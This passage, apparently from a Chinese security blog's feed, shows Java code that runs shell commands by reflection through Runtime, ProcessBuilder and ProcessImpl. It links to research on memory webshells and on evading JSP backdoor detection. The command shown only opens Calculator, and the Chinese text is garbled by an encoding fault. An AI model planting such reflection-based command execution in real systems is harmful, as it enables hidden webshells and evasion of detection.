string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å½“ä½¿ç”¨Listç±»å‹çš„æ„é€ å‚æ•°</span>        <span class="token comment">//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessBuilder</span> reflectProcessBuilder <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">ReflectProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        reflectProcessBuilder.ReflectPB0();</span>        <span class="token class-name"><span class="token namespace">reflectProcessBuilder<span class="token punctuation">.</span></span>ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessImpl</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span> redirect <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> dir <span class="token operator">=</span> <span class="token string">"."</span><span class="token punctuation">;</span>        <span class="token comment">//ç¬¬å››ä¸ªå‚æ•°dirä¸èƒ½ä¸ºç©ºï¼Œä¸ºç©ºä¼šå¤±è´¥ï¼Œè¡¨ç¤ºåœ¨å“ªä¸ªè·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">,</span> map<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessImpl</span> reflectProcess <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectProcessImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">reflectProcess<span class="token punctuation">.</span></span>ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ForkAndExec"><a href="#ForkAndExec" class="headerlink" title="ForkAndExec"></a>ForkAndExec</h2><p>å¯ä»¥ä½¿ç”¨ASMæ‰§è¡Œï¼Œå‚è€ƒsu18å¸ˆå‚…çš„<a href="https://github.com/su18/JNDI/blob/master/src/main/java/org/su18/asm/payload/Command.java">JNDI</a></p><h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><ul><li>åå°„æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆéœ€è¦æ˜ç™½å¦‚ä½•è·å–å®ä¾‹çš„å¯¹è±¡ï¼Œè§Runtimeæ‰§è¡Œå‘½ä»¤çš„ä¸‰ç§æ–¹å¼</li><li><code>constructor</code>åˆå§‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œæ³¨æ„å‚æ•°æ˜¯Objectæ•°ç»„ï¼Œä½¿ç”¨<code>new Object[]</code>å¼ºåˆ¶è½¬æ¢</li></ul><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://xiashang.xyz/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/">è®°ä¸€æ¬¡æ— æ–‡ä»¶Webshellæ”»å‡»åˆ†æ</a></li><li><a href="https://xz.aliyun.com/t/2342">åˆ©ç”¨Javaåå°„å’Œç±»åŠ è½½æœºåˆ¶ç»•è¿‡JSPåé—¨æ£€æµ‹</a></li><li><a href="https://xz.aliyun.com/t/10583">ä»Springå†…å­˜é©¬æ£€æµ‹åˆ°éšå½¢é©¬</a></li><li><a href="https://landgrey.me/blog/12/">åŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484259&idx=1&sn=2f132a952ec5e30ecefc9d3acef3cac5&chksm=cf36fb23f8417235ba1b14d9bd5c9efd3f293145b4e3b5a1b771f3a97316f15c0500fbfdb724&scene=132#wechat_redirect">Spring cloud gatewayé€šè¿‡SPELæ³¨å…¥å†…å­˜é©¬</a></li><li><a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">åŠè‡ªåŠ¨åŒ–æŒ–æ˜requestå®ç°å¤šç§ä¸­é—´ä»¶å›æ˜¾</a></li><li><a href="https://www.anquanke.com/post/id/214435">JSP Webshellé‚£äº›äº‹â€”â€”æ”»å‡»ç¯‡ï¼ˆä¸Šï¼‰</a></li><li><a href="https://xz.aliyun.com/t/10535">æµ…è°ˆåŠ è½½å­—èŠ‚ç ç›¸å…³çš„Javaå®‰å…¨é—®é¢˜</a></li><li><a href="https://xz.aliyun.com/t/10075">Javaå†…å­˜æ”»å‡»æŠ€æœ¯æ¼«è°ˆ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Runtime&quot;&gt;&lt;a href=&quot;#Runtime&quot; class=&quot;headerlink&quot; title=&quot;Runtime&quot;&gt;&lt;/a&gt;Runtime&lt;/h2&gt;&lt;p&gt;Runtimeä¸­å¯ä»¥è·å–åˆ°&lt;code&gt;Runtime&lt;/code&gt;å®ä¾‹æœ‰ä¸‰ç§æ–¹æ³•:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;private static Runtime currentRuntime = new Runtime();&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;public static Runtime getRuntime()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;private Runtime() &amp;#123;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/2022/03/22/java-reflection-shell/2.png&quot;&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectRuntime&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//åˆ©ç”¨ç§æœ‰å˜é‡ç”Ÿæˆå®ä¾‹ private static Runtime currentRuntime = new Runtime();&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; field &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;currentRuntime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        field&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; field&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//åˆ©ç”¨     public static Runtime getRuntime() &amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//        return currentRuntime;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//    &amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getRuntime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;


    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// åˆ©ç”¨æ„é€ å‡½æ•° private Runtime() &amp;#123;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
